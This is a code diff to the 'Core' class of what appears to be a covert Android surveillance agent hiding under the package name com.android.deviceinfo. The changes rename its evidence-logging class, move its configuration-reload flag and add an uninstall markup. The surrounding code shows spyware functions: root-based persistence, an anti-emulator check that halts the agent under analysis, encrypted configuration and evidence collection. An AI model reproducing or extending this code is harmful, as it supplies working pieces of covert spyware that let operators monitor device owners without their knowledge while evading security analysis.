@@ -30,7 +30,7 @@ import com.android.deviceinfo.conf.ConfType;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.evidence.EvDispatcher;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
@@ -54,6 +54,7 @@ public class Core extends Activity implements Runnable {
 	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
+	private static final int UNINSTALL_MARKUP = 87623547;
 	private static boolean serviceRunning = false;
 
 	/** The b stop core. */
@@ -76,7 +77,6 @@ public class Core extends Activity implements Runnable {
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
-	private boolean reload = false;
 
 	@SuppressWarnings("unused")
 	private void Core() {
@@ -171,13 +171,12 @@ public class Core extends Activity implements Runnable {
 		WR wifiReceiver = new WR();
 		Status.getAppContext().registerReceiver(wifiReceiver, intentFilter);
 
-		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
+		EvidenceBuilder.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
 
 		if (Cfg.DEMO) {
 			Status.self().makeToast(M.e("Agent started!"));
-			//Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		return true;
@@ -463,7 +462,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// Initialize persistence
-			if (Root.isRootShellInstalled()) {
+			if (PackageInfo.checkRoot()) {
 				Persistence p = new Persistence(Status.getAppContext());
 
 				p.storePackage();
@@ -471,7 +470,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// this markup is created by UninstallAction
-			final Markup markup = new Markup(0);
+			final Markup markup = new Markup(UNINSTALL_MARKUP);
 
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
@@ -599,11 +598,11 @@ public class Core extends Activity implements Runnable {
 
 			if (!loaded) {
 				// 30_2=Invalid new configuration, reverting
-				EvidenceReference.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
+				EvidenceBuilder.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
 				file.delete();
 			} else {
 				// 30_3=New configuration activated
-				EvidenceReference.info(M.e("New configuration activated")); //$NON-NLS-1$
+				EvidenceBuilder.info(M.e("New configuration activated")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -621,7 +620,7 @@ public class Core extends Activity implements Runnable {
 
 				if (!loaded) {
 					// Actual configuration corrupted
-					EvidenceReference.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
+					EvidenceBuilder.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
@@ -813,15 +812,6 @@ public class Core extends Activity implements Runnable {
 			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss(), true);
 			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty(), true);
 		}
-
-	}
-
-	public synchronized void reload() {
-		this.reload = true;
-	}
-
-	public synchronized boolean wantsReload() {
-		return reload;
 	}
 
 	public synchronized boolean reloadConf() {
@@ -829,12 +819,12 @@ public class Core extends Activity implements Runnable {
 			Check.log(TAG + " (reloadConf): START");
 		}
 
-		if (verifyNewConf() || reload) {
+		if (verifyNewConf() || Status.self().wantsReload()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (reloadConf): valid conf");
+				Check.log(TAG + " (reloadConf): valid conf, reload: " + Status.self().wantsReload());
 			}
-			
-			reload = false;
+
+			Status.self().unsetReload();
 			stopAll();
 
 			int ret = taskInit();
@@ -881,10 +871,18 @@ public class Core extends Activity implements Runnable {
 
 		AntiEmulator am = new AntiEmulator();
 		if (am.isEmu()) {
-			// deceptionCode2();
 			return false;
 		}
 		return true;
+	}
+
+	public void createMarkup() {
+		final Markup markup = new Markup(UNINSTALL_MARKUP);
+		boolean ret = markup.createEmptyMarkup();
+		if (Cfg.DEBUG) {
+			Check.asserts(ret, " (createMarkup) Assert failed, cannot create markup");
+		}
+
 	}
 
 }
